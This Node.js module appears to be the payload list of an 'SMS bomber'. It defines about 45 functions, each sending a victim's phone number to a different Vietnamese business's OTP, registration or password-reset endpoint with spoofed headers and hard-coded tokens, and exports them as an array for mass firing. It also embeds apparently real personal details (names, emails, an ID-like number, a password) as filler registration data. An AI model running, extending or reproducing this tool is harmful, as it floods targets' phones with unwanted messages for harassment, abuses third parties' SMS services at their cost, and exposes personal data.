//api SMS no CALL
const axios = require("axios");
async function tv360(phone) {
    try {
        await axios.post("https://m.tv360.vn/public/v1/auth/get-otp-login", { msisdn: phone }, {
            headers: {
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) Chrome/114.0.5735.130 Mobile Safari/537.36",
                "content-type": "application/json"
            }
        });
        return true;
    } catch { return false; }
}
async function robot(phone) {
    try {
        await axios.post("https://vietloan.vn/register/phone-resend",
            new URLSearchParams({ phone, _token: "0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU" }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function fb(phone) {
    try {
        await axios.get("https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister", {
            params: { phoneNumber: phone },
            headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function mocha(phone) {
    try {
        await axios.post("https://v9-cc.800best.com/uc/account/sendsignupcode", {
            phoneNumber: phone, verificationCodeType: 1
        }, {
            headers: {
                "accept": "application/json",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0"
            }
        });
        return true;
    } catch { return false; }
}
async function dvcd(phone) {
    try {
        await axios.post("https://viettel.vn/api/get-otp", { msisdn: phone }, {
            headers: {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "user-agent": "Mozilla/5.0"
            }
        });
        return true;
    } catch { return false; }
}
async function myvt(phone) {
    try {
        await axios.post("https://viettel.vn/api/get-otp-login", { phone, type: "" }, {
            headers: {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "user-agent": "Mozilla/5.0"
            }
        });
        return true;
    } catch { return false; }
}
async function phar(phone) {
    try {
        await axios.post("https://api-gateway.pharmacity.vn/customers/register/otp", { phone, referral: "" }, {
            headers: {
                "accept": "*/*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0"
            }
        });
        return true;
    } catch { return false; }
}
async function dkimu(phone) {
    try {
        await axios.post("https://api-omni.mutosi.com/client/auth/register", {
            name: "hà khải", phone, password: "Vjyy1234@", confirm_password: "Vjyy1234@", firstname: null, lastname: null, verify_otp: 0, store_token: "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b", email: "dđ@gmail.com", birthday: "2006-02-13", accept_the_terms: 1, receive_promotion: 1
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function fptshop(phone) {
    try {
        await axios.post("https://papi.fptshop.com.vn/gw/is/user/new-send-verification", {
            fromSys: "WEBKHICT", otpType: "0", phoneNumber: phone
        }, {
            headers: { "accept": "*/*", "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function meta(phone) {
    try {
        await axios.post("https://meta.vn/app_scripts/pages/AccountReact.aspx", {
            api_args: { lgUser: phone, type: "phone" },
            api_method: "CheckRegister"
        }, {
            params: { api_mode: "1" },
            headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function concung(phone) {
    try {
        await axios.post("https://shopiness.vn/ajax/user",
            new URLSearchParams({ action: "verify-registration-info", phoneNumber: phone, refCode: "" }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": "Mozilla/5.0" } }
        );
        return true;
    } catch { return false; }
}
async function money(phone) {
    try {
        await axios.post("https://moneyveo.vn/vi/registernew/sendsmsjson/",
            new URLSearchParams({ phoneNumber: phone }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": "Mozilla/5.0" } }
        );
        return true;
    } catch { return false; }
}
async function sapo(phone) {
    try {
        await axios.post("https://www.sapo.vn/fnb/sendotp",
            new URLSearchParams({ phonenumber: phone }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function hoang(phone) {
    try {
        await axios.post("https://hoang-phuc.com/advancedlogin/otp/sendotp/",
            new URLSearchParams({ action_type: "1", tel: phone }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function winmart(phone) {
    try {
        await axios.post("https://api-crownx.winmart.vn/iam/api/v1/user/register", {
            firstName: "Taylor Jasmine",
            phoneNumber: phone,
            masanReferralCode: "",
            dobDate: "2005-08-05",
            gender: "Male"
        }, {
            headers: { "accept": "application/json", "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function alf(phone) {
    try {
        await axios.post("https://api.alfrescos.com.vn/api/v1/User/SendSms", {
            phoneNumber: phone, secureHash: "ebe2ae8a21608e1afa1dbb84e944dc89", deviceId: "", sendTime: 1691127801586, type: 1
        }, { params: { culture: "vi-VN" }, headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function guma(phone) {
    try {
        await axios.post("https://cms.gumac.vn/api/v1/customers/verify-phone-number", { phone }, {
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function kingz(phone) {
    try {
        await axios.post("https://api.onelife.vn/v1/gateway/", {
            operationName: "SendOTP",
            variables: { phone },
            query: "mutation SendOTP($phone: String!) { sendOtp(input: {phone: $phone, captchaSignature: \"\", email: \"\"}) { otpTrackingId __typename } }"
        }, {
            headers: { "content-type": "application/json" }
        });
        return true;
    } catch { return false; }
}
async function acfc(phone) {
    try {
        await axios.post("https://www.acfc.com.vn/mgn_customer/customer/sendOTP",
            new URLSearchParams({ number_phone: phone, form_key: "z6U4dNbxwcokMy9u", currentUrl: "https://www.acfc.com.vn/customer/account/create/" }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function phuc(phone) {
    try {
        await axios.post("https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd", { userName: phone }, {
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function medi(phone) {
    try {
        await axios.post("https://medicare.vn/api/otp", { mobile: phone, mobile_country_prefix: "84" }, {
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function emart(phone) {
    try {
        await axios.post("https://emartmall.com.vn/index.php?route=account/register/smsRegister",
            new URLSearchParams({ mobile: phone }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function hana(phone) {
    try {
        await axios.post("https://api.vayvnd.vn/v2/users/password-reset", {
            login: phone,
            trackingId: "8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3"
        }, { headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function med(phone) {
    try {
        await axios.post("https://api-v2.medpro.com.vn/user/phone-register", {
            fullname: "người dùng medpro",
            deviceId: "401387b523eda9fc5998c36541400134",
            phone,
            type: "password"
        }, { headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function ghn(phone) {
    try {
        await axios.post("https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp", { phone, type: "register" }, {
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function shop1(phone) { // shopiness
    try {
        await axios.post("https://tfs-api.hsv-tech.io/client/phone-verification/request-verification", { phoneNumber: phone }, {
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function gala(phone) {
    try {
        await axios.post("https://api.glxplay.io/account/phone/verify", null, {
            params: { phone },
            headers: { "accept": "*/*", "user-agent": "Mozilla/5.0" }
        });
        return true;
    } catch { return false; }
}
async function fa(phone) {
    try {
        await axios.post("https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
            new URLSearchParams({ phone }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function cathay(phone) {
    try {
        await axios.post("https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP",
            new URLSearchParams({
                memberMap: JSON.stringify({
                    userName: "trongkhai611@gmail.com",
                    password: "ditmetzk",
                    birthday: "19/07/1988",
                    certificateNumber: "001088647384",
                    phone: phone,
                    email: "trongkhai611@gmail.com",
                    LINK_FROM: "signUp2",
                    memberID: "",
                    CUSTOMER_NAME: "NGUYỄN HUY HOÀNG"
                }),
                OTP_TYPE: "P",
                LANGS: "vi_VN"
            }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function vina(phone) {
    try {
        await axios.post("https://new.vinamilk.com.vn/api/account/getotp",
            `{"type":"register","phone":"${phone}"}`,
            { headers: { "content-type": "text/plain;charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function ahamove(phone) {
    try {
        await axios.post("https://api.ahamove.com/api/v3/public/user/register", {
            mobile: phone,
            name: "khải",
            email: "khaissn@gmail.com",
            country_code: "VN",
            firebase_sms_auth: "true",
            time: 1720101304,
            checksum: "Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg=="
        }, { headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function air(phone) {
    try {
        await axios.post("https://vietair.com.vn/Handler/CoreHandler.ashx",
            new URLSearchParams({
                op: "PACKAGE_HTTP_POST",
                path_ajax_post: "/service03/sms/get",
                package_name: "PK_FD_SMS_OTP",
                object_name: "INS",
                P_MOBILE: phone,
                P_TYPE_ACTIVE_CODE: "DANG_KY_NHAN_OTP"
            }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" } }
        );
        return true;
    } catch { return false; }
}
async function otpmu(phone) {
    try {
        await axios.post("https://api-omni.mutosi.com/client/auth/reset-password/send-phone", {
            phone,
            token: "03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw",
            source: "web_consumers"
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function vtpost(phone) {
    try {
        await axios.post("https://id.viettelpost.vn/Account/SendOTPByPhone",
            new URLSearchParams({
                "FormRegister.FullName": "Taylor Jasmine",
                "FormRegister.Phone": phone,
                "FormRegister.Password": "vjyy1234",
                "FormRegister.ConfirmPassword": "vjyy1234",
                "ReturnUrl": "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs",
                "ConfirmOtpType": "Register",
                "FormRegister.IsRegisterFromPhone": "true",
                "__RequestVerificationToken": "CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ"
            }).toString(),
            { headers: { "content-type": "application/x-www-form-urlencoded" } }
        );
        return true;
    } catch { return false; }
}
async function shine(phone) {
    try {
        await axios.post("https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send", { phone }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function domi(phone) {
    try {
        await axios.post("https://dominos.vn/api/v1/users/send-otp", {
            phone_number: phone, email: "nguyentrongkhai130@gmail.com", type: 0, is_register: true
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function fm(phone) {
    try {
        await axios.post("https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2", {
            Phone: phone, LatOfMap: "106", LongOfMap: "108", Browser: ""
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function cir(phone) {
    try {
        await axios.post("https://api.circa.vn/v1/entity/validation-phone", {
            phone: { country_code: "84", phone_number: phone }
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function hoanvu(phone) {
    try {
        await axios.post("https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
            { phoneNumber: phone }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function tokyo(phone) {
    try {
        await axios.post("https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register", {
            phone_number: phone, name: "khải nguyễn", password: "vjyy1234", email: "trongkhai1118@gmail.com", birthday: "2002-07-10", gender: "female"
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function shop2(phone) { // thefaceshop
    try {
        await axios.post("https://tfs-api.hsv-tech.io/client/phone-verification/request-verification", { phoneNumber: phone }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function beau(phone) {
    try {
        await axios.post("https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification", { phoneNumber: phone }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function fu(phone) {
    try {
        await axios.post("https://api.vato.vn/api/authenticate/request_code", {
            phoneNumber: phone,
            deviceId: "e3025fb7-5436-4002-9950-e6564b3656a6",
            use_for: "LOGIN"
        }, { headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" } });
        return true;
    } catch { return false; }
}
async function lote(phone) {
    try {
        await axios.post("https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp", {
            username: phone, case: "register"
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}
async function lon(phone) {
    try {
        await axios.post("https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification", {
            phoneNumber: phone, otpType: 0, fromSys: "WEBKHLC"
        }, { headers: { "content-type": "application/json" } });
        return true;
    } catch { return false; }
}

module.exports = [
    tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana, med, ghn, shop1, gala, fa, cathay, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop2, beau, fu, lote, lon
];
